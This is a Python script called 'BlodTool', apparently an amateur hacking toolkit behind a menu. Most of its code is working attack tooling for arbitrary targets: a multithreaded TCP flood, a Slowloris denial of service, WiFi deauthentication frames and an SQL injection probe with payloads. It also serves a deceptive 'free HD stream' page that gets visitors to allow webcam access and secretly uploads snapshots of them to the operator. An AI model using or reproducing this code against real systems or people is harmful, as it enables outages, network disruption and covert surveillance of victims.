#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# BlodTool - good create by injectorX69

import os
import sys
import time
import json
import random
import socket
import string
import threading
import http.server
import socketserver
import urllib.request
import urllib.parse

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False

R = "\033[91m"
W = "\033[97m"
G = "\033[92m"
Y = "\033[93m"
DIM = "\033[90m"
BOLD = "\033[1m"
RESET = "\033[0m"

BANNER = r"""
 ▄▄▄▄     ██▓      ▓█▄▄██    ▓█▄▄██   ▓█▄███▄  ▄▄▄█▄███▓  ▓█▄▄██    ▓█▄▄██    ██▓
▓█▄ ██▄  ▓██▒     ▓██▒  ██▓ ▓██▒  ██▓ ▒██▀ ██▌ ▓  ██▒ ▓▒ ▓██▒  ██▓ ▓██▒  ██▓ ▓██▒
▒██▒ ▄██ ▒██░     ▒██░  ██▒ ▒██░  ██▒ ░█    █▌ ▒ ▓██░ ▒░ ▒██░  ██▒ ▒██░  ██▒ ▒██░
▒▄ ░█▀   ▒█ ░     ▒██  ▄▀▒░ ▒██  ▄▀▒░ ░▓█▄   ▌ ░ ▓▄█▓ ░  ▒██  ▄▀▒░ ▒██  ▄▀▒░ ▒█ ░
░▓█   █▓ ░▄█████▒ ░ █▀▀ ▓▒░ ░ █▀▀ ▓▒░ ░▒████▓    ▒██▒ ░  ░ █▀▀ ▓▒░ ░ █▀▀ ▓▒░ ░▄█████▒
░▒▒███▀▒ ░ ▒░▓  ░ ░ ▒░▓░▓░  ░ ▒░▓░▓░   ▒▒▓  ▒    ▒ ░░    ░ ▒░▓░▓░  ░ ▒░▓░▓░  ░ ▒░▓  ░
▒░▒   ░  ░ ░ ▒  ░   ░ ▒ ▒░    ░ ▒ ▒░   ░ ▒  ▒      ░       ░ ▒ ▒░    ░ ▒ ▒░  ░ ░ ▒  ░
 ░    ░    ░ ░    ░ ░ ░ ▒   ░ ░ ░ ▒    ░ ░  ░    ░       ░ ░ ░ ▒   ░ ░ ░ ▒     ░ ░
 ░           ░  ░     ░ ░       ░ ░      ░                   ░ ░       ░ ░       ░  ░
      ░                                ░
"""

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def loading():
    """White glow / flash loading animation before the banner appears."""
    clear()
    # 1) growing white bar
    for i in range(1, 41):
        clear()
        bar = "#" * i
        print("")
        print(W + BOLD + bar.center(80) + RESET)
        print(DIM + ("loading BlodTool " + str(i * 2) + "%").center(80) + RESET)
        time.sleep(0.03)
    # 2) full white flash blinking
    for _ in range(5):
        clear()
        print(W + BOLD + ("█" * 80).center(80) + RESET)
        time.sleep(0.07)
        clear()
        time.sleep(0.05)
    # 3) banner fades in: white -> red
    clear()
    print(W + BOLD + BANNER + RESET)
    time.sleep(0.35)
    clear()
    print(R + BOLD + BANNER + RESET)
    print(R + "            good create by injectorX69" + RESET)
    time.sleep(0.8)

def menu():
    clear()
    print(R + BOLD + BANNER + RESET)
    print(R + "            good create by injectorX69" + RESET)
    print("")
    opts = ["SQL Injection Scanner", "PhoneTracer", "IP Tracer", "DDOS (TCP flood)",
            "DOS (Slowloris)", "WiFi Attack (deauth)", "Phone Number Generator",
            "Email Generator", "Localhost Web Server", "Camera Capture Site", "Exit"]
    for i in range(len(opts)):
        print(R + "  " + str(i + 1).rjust(2) + ". " + opts[i] + RESET)
    print("")

def ask(prompt, default=None):
    v = input(prompt).strip()
    return v if v else default

def to_int(v, d):
    try:
        return int(v)
    except (ValueError, TypeError):
        return d

# ---------------- Tools ----------------

def sql_tool():
    if not HAS_REQUESTS:
        print(Y + "[!] Run: pip install requests" + RESET)
        return
    url = ask("Target URL (e.g. http://site.com/item.php?id=1): ")
    if not url:
        return
    payloads = ["'", "\"", "' OR '1'='1", "1' OR 1=1--", "1 UNION SELECT NULL--",
                "' AND SLEEP(3)--"]
    errors = ["sql", "mysql", "syntax", "warning", "quoted string", "oracle", "pg_", "sqlite"]
    print(Y + "[*] Testing SQLi on " + url + RESET)
    for p in payloads:
        test = url + urllib.parse.quote(p)
        try:
            r = requests.get(test, timeout=8)
            body = r.text.lower()
            hits = [e for e in errors if e in body]
            if hits:
                print("  [" + R + "VULNERABLE" + RESET + "] " + p + " -> " + str(hits))
            else:
                print("  [" + G + "clean" + RESET + "] " + p)
        except Exception as e:
            print("  [X] " + p + " : " + str(e))

def phone_tracer():
    try:
        import phonenumbers
        from phonenumbers import geocoder, carrier, timezone
    except ImportError:
        print(Y + "[!] Run: pip install phonenumbers" + RESET)
        return
    num = ask("Phone number (with + country code): ")
    try:
        p = phonenumbers.parse(num)
        if not phonenumbers.is_valid_number(p):
            print(R + "[X] Invalid number." + RESET)
            return
        print(G + "  Region   : " + str(geocoder.description_for_number(p, "en")) + RESET)
        print(G + "  Carrier  : " + str(carrier.name_for_number(p, "en")) + RESET)
        print(G + "  Timezone : " + str(timezone.time_zones_for_number(p)) + RESET)
        print(G + "  Valid    : True" + RESET)
    except Exception as e:
        print(R + "[X] " + str(e) + RESET)

def ip_tracer():
    ip = ask("IP address [auto]: ")
    if not ip:
        try:
            ip = urllib.request.urlopen("http://ip-api.com/json/", timeout=8)
            print(G + "  Your IP  : " + str(json.loads(ip.read()).get("query")) + RESET)
            return
        except Exception:
            return
    try:
        u = urllib.request.urlopen("http://ip-api.com/json/" + ip, timeout=8)
        data = json.loads(u.read())
        for k in ["country", "regionName", "city", "zip", "lat", "lon", "isp", "org", "as"]:
            print(G + "  " + k.ljust(10) + ": " + str(data.get(k)) + RESET)
    except Exception as e:
        print(R + "[X] " + str(e) + RESET)

def ddos_tool():
    host = ask("Target host: ")
    port = to_int(ask("Port [80]: "), 80)
    thr = to_int(ask("Threads [100]: "), 100)
    print(Y + "[*] TCP flood on " + host + ":" + str(port) + " with " + str(thr) + " threads (Ctrl+C to stop)" + RESET)
    running = [True]
    sent = [0]
    lock = threading.Lock()

    def flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((host, port))
        except Exception:
            return
        payload = os.urandom(1024)
        while running[0]:
            try:
                s.send(payload)
                with lock:
                    sent[0] += 1
            except Exception:
                return

    ts = []
    for _ in range(thr):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        ts.append(t)
    try:
        while True:
            time.sleep(1)
            print(G + "  [*] packets sent: " + str(sent[0]) + RESET)
    except KeyboardInterrupt:
        running[0] = False
        print(Y + "[*] Flood stopped." + RESET)

def dos_tool():
    host = ask("Target host: ")
    port = to_int(ask("Port [80]: "), 80)
    print(Y + "[*] Slowloris DOS on " + host + ":" + str(port) + " (Ctrl+C to stop)" + RESET)
    sockets = []
    try:
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(("GET /?" + str(random.randint(0, 99999)) + " HTTP/1.1\r\n").encode())
                s.send(("Host: " + host + "\r\nX-a: " + str(random.randint(0, 9999)) + "\r\n").encode())
                sockets.append(s)
                if len(sockets) % 25 == 0:
                    print(G + "  [*] " + str(len(sockets)) + " sockets open" + RESET)
            except Exception:
                time.sleep(0.2)
    except KeyboardInterrupt:
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass
        print(Y + "[*] Stopped. " + str(len(sockets)) + " sockets were opened." + RESET)

def wifi_attack():
    if not HAS_SCAPY:
        print(Y + "[!] Run: pip install scapy (then start tool as root/Administrator)" + RESET)
        return
    iface = ask("Monitor interface (e.g. wlan0mon): ")
    bssid = ask("Target BSSID (AP MAC): ")
    c = to_int(ask("Deauth count [100]: "), 100)
    client = ask("Client MAC [ff:ff:ff:ff:ff:ff]: ") or "ff:ff:ff:ff:ff:ff"
    print(Y + "[*] Sending " + str(c) + " deauth frames via " + iface + "..." + RESET)
    try:
        pkt = RadioTap() / Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        sendp(pkt * c, iface=iface, inter=0.05, verbose=False)
        print(G + "[+] Done." + RESET)
    except Exception as e:
        print(R + "[X] " + str(e) + RESET)

def phone_generator():
    n = to_int(ask("How many [10]: "), 10)
    codes = ask("Prefixes, comma separated [+420,+44]: ") or "+420,+44"
    print(Y + "[*] Generating " + str(n) + " numbers..." + RESET)
    for _ in range(n):
        c = random.choice([x.strip() for x in codes.split(",")])
        print(G + "  " + c + str(random.randint(100000000, 999999999)) + RESET)

def email_generator():
    n = to_int(ask("How many [10]: "), 10)
    doms = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "protonmail.com"]
    print(Y + "[*] Generating " + str(n) + " emails..." + RESET)
    for _ in range(n):
        user = "".join(random.choices(string.ascii_lowercase, k=6)) + str(random.randint(10, 999))
        print(G + "  " + user + "@" + random.choice(doms) + RESET)

def localhost_web():
    port = to_int(ask("Port [8080]: "), 8080)
    if not os.path.isdir("blodweb"):
        os.makedirs("blodweb")
    idx = os.path.join("blodweb", "index.html")
    if not os.path.exists(idx):
        f = open(idx, "w")
        f.write("<!DOCTYPE html><html><head><title>BlodTool Web</title></head>"
                "<body style='background:#111;color:#e33;font-family:monospace;text-align:center'>"
                "<h1>BlodTool Localhost Web</h1><p>good create by injectorX69</p></body></html>")
        f.close()
    os.chdir("blodweb")
    handler = http.server.SimpleHTTPRequestHandler
    try:
        httpd = socketserver.TCPServer(("", port), handler)
    except OSError:
        print(R + "[X] Port " + str(port) + " already in use." + RESET)
        return
    print(G + "[+] Serving at http://localhost:" + str(port) + " (Ctrl+C to stop)" + RESET)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(Y + "\n[*] Server stopped." + RESET)

def camera_site():
    """Localhost page that captures a webcam snapshot from the visitor's browser
    (after they click Allow) and saves it to blodcam/. Test only on your own
    devices/network."""
    port = to_int(ask("Port [8080]: "), 8080)
    if not os.path.isdir("blodcam"):
        os.makedirs("blodcam")
    html = ("<!DOCTYPE html><html><head><title>HD Streaming</title></head>"
            "<body style='background:#000;color:#fff;font-family:sans-serif;text-align:center'>"
            "<h2>HD Camera Streaming Portal</h2>"
            "<p>Click Allow to start free HD stream.</p>"
            "<video id='v' autoplay width='640'></video><script>"
            "navigator.mediaDevices.getUserMedia({video:true}).then(s=>{"
            "document.getElementById('v').srcObject=s;"
            "setTimeout(()=>{const c=document.createElement('canvas');"
            "c.width=640;c.height=480;"
            "c.getContext('2d').drawImage(document.getElementById('v'),0,0,640,480);"
            "fetch('/capture',{method:'POST',body:c.toDataURL().split(',')[1]});},3000);"
            "}).catch(()=>{});</script></body></html>")
    f = open(os.path.join("blodcam", "index.html"), "w")
    f.write(html)
    f.close()

    class H(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            http.server.SimpleHTTPRequestHandler.__init__(self, *a, directory="blodcam", **kw)

        def log_message(self, *a):
            pass

        def do_POST(self):
            data = self.rfile.read(int(self.headers["Content-Length"]))
            fname = "blodcam/cam_" + str(int(time.time())) + "_" + str(random.randint(100, 999)) + ".png"
            f = open(fname, "wb")
            f.write(data)
            f.close()
            print(G + "[+] Captured snapshot: " + fname + RESET)
            self.send_response(200)
            self.end_headers()

    try:
        httpd = socketserver.TCPServer(("", port), H)
    except OSError:
        print(R + "[X] Port " + str(port) + " already in use." + RESET)
        return
    ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    print(G + "[+] Camera site running:" + RESET)
    print(G + "    local : http://localhost:" + str(port) + RESET)
    print(G + "    lan   : http://" + ip + ":" + str(port) + RESET)
    print(Y + "[*] Snapshots save to blodcam/ (Ctrl+C to stop)" + RESET)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(Y + "\n[*] Server stopped." + RESET)

TOOLS = {1: sql_tool, 2: phone_tracer, 3: ip_tracer, 4: ddos_tool, 5: dos_tool,
         6: wifi_attack, 7: phone_generator, 8: email_generator, 9: localhost_web,
         10: camera_site}

def main():
    loading()
    while True:
        menu()
        try:
            line = input(R + BOLD + "BlodTool > " + RESET)
            choice = int(line)
        except (ValueError, KeyboardInterrupt):
            continue
        if choice == 11:
            clear()
            print(R + "BlodTool - good create by injectorX69. Goodbye!" + RESET)
            sys.exit(0)
        fn = TOOLS.get(choice)
        if fn:
            try:
                fn()
            except KeyboardInterrupt:
                pass
            input(Y + "\n[Enter] to return to menu..." + RESET)

main()
